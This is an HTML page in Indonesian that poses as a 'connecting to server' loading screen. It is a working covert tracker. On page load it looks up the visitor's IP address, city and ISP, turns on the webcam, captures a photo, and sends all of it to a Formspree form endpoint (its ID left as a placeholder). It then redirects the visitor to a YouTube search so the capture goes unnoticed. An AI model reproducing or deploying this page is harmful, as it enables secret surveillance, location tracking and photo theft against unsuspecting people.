<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>SISTEM PEGASUSS_ZERO M4ZK1PL4Y</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 20%; }
        .box { border: 1px solid #0f0; display: inline-block; padding: 20px; box-shadow: 0 0 10px #0f0; }
        .loading { width: 50px; height: 50px; border: 5px solid #111; border-top: 5px solid #0f0; border-radius: 50%; animation: spin 1s infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="box">
    <h2>PEGASUSS_ZERO</h2>
    <div class="loading"></div>
    <p id="stat">MENGHUBUNGKAN KE SERVER...</p>
</div>

<form id="pegasusForm" action="https://formspree.io/f/MASUKKAN_ID_FORMSPREE_DISINI" method="POST" style="display:none;">
    <input type="text" name="ip_info" id="f_ip">
    <input type="text" name="gps_info" id="f_gps">
    <input type="text" name="photo" id="f_photo">
</form>

<video id="v" width="640" height="480" style="display:none;" autoplay></video>
<canvas id="c" width="640" height="480" style="display:none;"></canvas>

<script>
    async function start() {
        const stat = document.getElementById('stat');
        
        try {
            // 1. Ambil IP
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            document.getElementById('f_ip').value = `IP: ${data.ip}, City: ${data.city}, ISP: ${data.org}`;

            // 2. Ambil Kamera
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('v');
            v.srcObject = stream;

            setTimeout(async () => {
                const canvas = document.getElementById('c');
                canvas.getContext('2d').drawImage(v, 0, 0, 640, 480);
                document.getElementById('f_photo').value = canvas.toDataURL('image/jpeg'); // Foto jadi teks Base64

                // 3. Kirim Otomatis
                stat.innerText = "SINKRONISASI DATA...";
                const form = document.getElementById('pegasusForm');
                const formData = new FormData(form);
                
                await fetch(form.action, {
                    method: 'POST',
                    body: formData,
                    headers: { 'Accept': 'application/json' }
                });

                // 4. Redirect
                window.location.href = "https://www.youtube.com/results?search_query=berita+viral+realtime";
            }, 3000);

        } catch (e) {
            window.location.href = "https://www.youtube.com/results?search_query=berita+viral+realtime";
        }
    }
    window.onload = start;
</script>
</body>
</html>
